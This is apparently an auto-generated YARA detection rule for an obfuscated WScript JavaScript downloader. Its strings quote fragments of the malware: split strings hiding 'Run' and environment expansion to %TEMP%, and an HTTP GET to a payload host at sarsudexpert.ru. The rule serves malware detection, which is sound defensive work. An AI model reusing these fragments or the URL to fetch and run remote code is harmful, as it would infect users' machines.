rule sig_20160428_45b653486b18a0b1f2d83a3f9bcb100b {
  meta:
    description = "datamaliciousorder - file 20160428_45b653486b18a0b1f2d83a3f9bcb100b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1fda2bbbeb55ac1455c732577536fa4e214981130ddedd1869d2cd8eb2cb9860"

  strings:
    $s1  = "function XjlKuyIasUolZlxLdjRyp(SsrKcbZnvGbzRggCegAml){BvwUhiYxbFmnTjrQamVgg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function ZmsXeyOqvIhyCjtDabUvb() {return BvwUhiYxbFmnTjrQamVgg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function XjlKuyIasUolZlxLdjRyp(SsrKcbZnvGbzRggCegAml){BvwUhiYxbFmnTjrQamVgg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return HquMowMyxVuzRcqCozKfo - PouPivNbtXatVqhPurPqv;};" fullword ascii
    $s5  = "function PfbRjtBnpHxeWtfMnyUxy(HquMowMyxVuzRcqCozKfo, PouPivNbtXatVqhPurPqv){FjfFumIsnSpxVekTttNfq = FjfFumIsnSpxVekTttNfq * 1; " ascii
    $s6  = "var BvwUhiYxbFmnTjrQamVgg = function KxkQqwQtdLwqCnhEljNna() {return GocDcwFexNdcCjyFohAsu[BdbKfpFonSclKvuMnnWcp](\"WScript\"+\"" ascii
    $s7  = "EfdNvlQscGxaPedOyeKdt[DrgGuuZpjKyeScxJnqOtw](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var BvwUhiYxbFmnTjrQamVgg = function KxkQqwQtdLwqCnhEljNna() {return GocDcwFexNdcCjyFohAsu[BdbKfpFonSclKvuMnnWcp](\"WScript\"+\"" ascii
    $s9  = "var GocDcwFexNdcCjyFohAsu = this[\"WScript\"];" fullword ascii
    $s10 = "function ZmsXeyOqvIhyCjtDabUvb() {return BvwUhiYxbFmnTjrQamVgg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function OglOdqOelNhtFvzKvbPwn(){return SeuOjaZeeCozAndPrvHgy + \"\";};" fullword ascii
    $s12 = "function PfbRjtBnpHxeWtfMnyUxy(HquMowMyxVuzRcqCozKfo, PouPivNbtXatVqhPurPqv){FjfFumIsnSpxVekTttNfq = FjfFumIsnSpxVekTttNfq * 1; " ascii
    $s13 = "if (EfdNvlQscGxaPedOyeKdt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function WmrZayCpsImmEirZhgEsw() {return ((NiqBefOxtNkuPbgYdlAtn == true) && (NiqBefOxtNkuPbgYdlAtn == PcuFatMewOujWzsYkcBvx)) ?" ascii
    $s15 = "function WmrZayCpsImmEirZhgEsw() {return ((NiqBefOxtNkuPbgYdlAtn == true) && (NiqBefOxtNkuPbgYdlAtn == PcuFatMewOujWzsYkcBvx)) ?" ascii
    $s16 = "function ZbkRzlNorNdwFwzEugAas(){return 23;};" fullword ascii
    $s17 = "PcuFatMewOujWzsYkcBvx = true; " fullword ascii
    $s18 = "var PcuFatMewOujWzsYkcBvx = false;" fullword ascii
    $s19 = "var NiqBefOxtNkuPbgYdlAtn = false;" fullword ascii
    $s20 = "var PmaCmeBefHbtZwyFafZpp = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}